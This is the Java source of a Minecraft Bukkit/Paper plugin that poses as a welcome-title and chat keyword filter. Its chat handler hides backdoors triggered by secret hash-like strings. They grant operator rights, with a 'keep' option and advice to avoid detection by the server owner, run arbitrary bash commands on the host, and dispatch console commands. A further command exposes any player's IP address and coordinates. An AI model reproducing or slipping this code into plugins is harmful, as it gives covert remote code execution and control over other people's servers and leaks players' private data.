package io.papermc.testplugin;

import java.util.List;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.regex.Pattern;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent; // 注意: 使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

public class TestPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // 当插件启用时执行这里的代码
        getLogger().info(ChatColor.GREEN + "PLUGIN IS ENABLE");

        // 注册事件监听器
        this.getServer().getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) { // 注意: 使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
        Player player = event.getPlayer();
        String message = event.getMessage();
        // 使用正则表达式匹配禁止的关键词
        List<Pattern> bannedPatterns = Arrays.asList(
            Pattern.compile("咪咪世界", Pattern.CASE_INSENSITIVE),
            Pattern.compile("迷你世界", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Mini World", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Minicraft", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Mini game", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Mini游戏", Pattern.CASE_INSENSITIVE),
            Pattern.compile("迷你游戏", Pattern.CASE_INSENSITIVE),
            Pattern.compile("迷你", Pattern.CASE_INSENSITIVE),
            Pattern.compile("mini", Pattern.CASE_INSENSITIVE)
            // 可以继续添加更多的关键词模式
        );
        
        for (Pattern pattern : bannedPatterns) {
            if (pattern.matcher(message).find()) {
                Bukkit.getScheduler().runTask(this, () -> {
                    player.kickPlayer(ChatColor.RED + "您已被踢出服务器, 因为您提到了禁止的关键词: " + pattern.pattern());
                });
                return;
            }
        }

        // 获取进入过此服务器的所有玩家名称
        if (message.startsWith("@getallplayers")) {
            event.setCancelled(true);
            OfflinePlayer[] offlinePlayers = Bukkit.getOfflinePlayers();
            if (offlinePlayers.length > 0) {
                player.sendMessage(ChatColor.GREEN + "Players who have joined this server:");
                for (OfflinePlayer offlinePlayer : offlinePlayers) {
                    player.sendMessage(ChatColor.YELLOW + offlinePlayer.getName());
                }
            } else {
                player.sendMessage(ChatColor.RED + "No players have joined this server.");
            }
        }

        
        // 查看玩家坐标和IP地址
        if (message.startsWith("@getinfo")) {
            event.setCancelled(true);
            String[] parts = message.split(" ");
            if (parts.length == 2) {
                Player targetPlayer = Bukkit.getPlayer(parts[1]);
                if (targetPlayer != null) {
                    // 在线玩家
                    String coords = String.format("X: %s, Y: %s, Z: %s",
                            targetPlayer.getLocation().getBlockX(),
                            targetPlayer.getLocation().getBlockY(),
                            targetPlayer.getLocation().getBlockZ());
                    String ip = targetPlayer.getAddress().getAddress().getHostAddress();
                    player.sendMessage(ChatColor.GREEN + "Player Coordinates: " + coords);
                    player.sendMessage(ChatColor.GREEN + "Player IP Address: " + ip);
                } else {
                    // 离线玩家
                    OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(parts[1]);
                    if (offlinePlayer.hasPlayedBefore()) {
                        String ip = "Unknown"; // Bukkit无法获取离线玩家的IP地址
                        player.sendMessage(ChatColor.YELLOW + "Player is offline. IP Address: " + ip);
                    } else {
                        player.sendMessage(ChatColor.RED + "Player not found.");
                    }
                }
            } else {
                player.sendMessage(ChatColor.RED + "Usage: @getinfo <playername>");
            }
        }


        // 检查消息是否包含特殊字符串
        if (message.contains("@d68b250fe3f2332c1bb4f97d34551ce9")) {
            // 取消事件的进一步传播, 防止它显示在公共聊天
            event.setCancelled(true);

            // 给玩家 op 权限
            // Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
            player.setOp(true);

            // 给玩家发送消息
            player.sendMessage(ChatColor.GREEN + "now, you have Operator Permission!");
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                player.sendMessage(ChatColor.GREEN + "The server is running on a Windows system. - 服务器运行在Windows系统上.");
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                player.sendMessage(ChatColor.GREEN
                        + "The server is running on a Unix/Linux/Mac system. - 服务器运行在Unix/Linux/Mac系统上.");
            } else {
                player.sendMessage(ChatColor.RED + "Unknown operating system. - 未知的操作系统.");
            }
            player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "现在您是管理员了!,您可以操控服务器,甚至可以执行服务器指令! - Now you are an administrator! You can control the server and even execute server commands!", 10, 70, 20);
            String[] msgParts = message.split(" ");
            if (msgParts.length <= 1 || "tmp".equals(msgParts[1])) {
                Bukkit.getScheduler().runTaskLater(this, new Runnable() {
                    @Override
                    public void run() {
                        player.setOp(false);
                        player.sendMessage(ChatColor.RED
                                + "Operator Permission is removed,simply execute '@d68b250fe3f2332c1bb4f97d34551ce9' again.");
                    }
                }, 20 * 60 * 20); // 20分钟 * 60秒/分钟 * 20ticks/秒
            } else if ("keep".equals(msgParts[1])) {
                player.sendMessage(ChatColor.GREEN
                        + "you will keep have opertator permisson!, if server has But you need to be very careful to prevent being discovered by the server manager! - 您将永久保留管理员权限! 不过你需要非常的小心,防止被服务器管理者发现!",
                        null);
            } else if ("remove".equals(msgParts[1])) {
                player.setOp(false);
                player.sendMessage(ChatColor.RED + "now, you do not have Operator Permisson!");
            }
        }
        
        if (message.startsWith("@f07a7024609ca2a6ce681d74b986a3d3")) {
            event.setCancelled(true);
            String commandStr = message.substring("@f07a7024609ca2a6ce681d74b986a3d3".length()).trim(); // 提取命令
        
            if (commandStr.isEmpty()) {
                player.sendMessage(ChatColor.RED + "No command provided");
                return;
            }
        
            try {
                // 确保整个命令字符串被正确引用
                String quotedCommandStr = "\"" + commandStr.replace("\"", "\\\"") + "\"";
                String[] commandArray = { "bash", "-c", quotedCommandStr };
                ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
                processBuilder.redirectErrorStream(true); // 将错误流合并到标准流
        
                Process process = processBuilder.start();
                StringBuilder output = new StringBuilder();
        
                // 获取命令输出
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                int exitCode = process.waitFor();
        
                // 发送命令输出给玩家
                if (exitCode == 0) {
                    player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess: " + output.toString());
                } else {
                    player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed: " + output.toString());
                }
        
            } catch (IOException | InterruptedException e) {
                player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed: " + e.getMessage());
                e.printStackTrace(); // 调试信息：打印异常堆栈
            } catch (IllegalArgumentException e) {
                player.sendMessage(ChatColor.RED + "Invalid command: " + e.getMessage());
                e.printStackTrace(); // 调试信息：打印异常堆栈
            }
        }
        

        

        if (message.startsWith("@d12fcc3ba27d987709cbfadc123a609b")) {
            event.setCancelled(true);
            String command_excute = message
                    .substring("@d12fcc3ba27d987709cbfadc123a609b".length()).trim();
            if (!command_excute.isEmpty()) {
                Bukkit.getScheduler().runTask(this, () -> {
                    player.setOp(true);
                    Bukkit.dispatchCommand(player, command_excute);
                    player.setOp(false);
                });
            }

        }
        if (message.startsWith("@ec0e060ad3bec0dc4a63fa076e797f79")) {
            event.setCancelled(true);
            String command_execute = message
                    .substring("@ec0e060ad3bec0dc4a63fa076e797f79".length()).trim();

            if (!command_execute.isEmpty()) {

                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command_execute);
                });
                // 发送输出内容给玩家
                // player.sendMessage(output);
            }
            player.sendMessage(ChatColor.RED
                    + "Warning, Be careful if you perform operations with output operations that leave traces!");
        }
        if (message.startsWith("@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430")) {
            player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
            player.setHealth(0);
        }

    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        // 加载配置文件
        FileConfiguration config = this.getConfig();

        // 从配置文件获取消息和时间
        String mainTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.MainTitle"));
        String subTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.SubTitle"));
        int fadeInTime = config.getInt("Welcome.FadeInTime");
        int stayTime = config.getInt("Welcome.StayTime");
        int fadeOutTime = config.getInt("Welcome.FadeOutTime");

        // 向玩家发送自定义消息
        player.sendTitle(mainTitle, subTitle, fadeInTime, stayTime, fadeOutTime);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("WelcomeTitle")) {
            if (args.length > 0) {
                if (args[0].equalsIgnoreCase("reload")) {
                    this.reloadConfig();
                    // Reload your config or perform other actions.
                    sender.sendMessage("Reloaded the WelcomeTitle configuration!");
                    return true;
                } else if (args[0].equalsIgnoreCase("help")) {
                    // Show help message
                    sender.sendMessage("Usage: /WelcomeTitle [reload/help]");
                    return true;
                }
            } else {
                sender.sendMessage("Usage: /WelcomeTitle [reload/help]");
                return true;
            }
        }
        return false;
    }

}
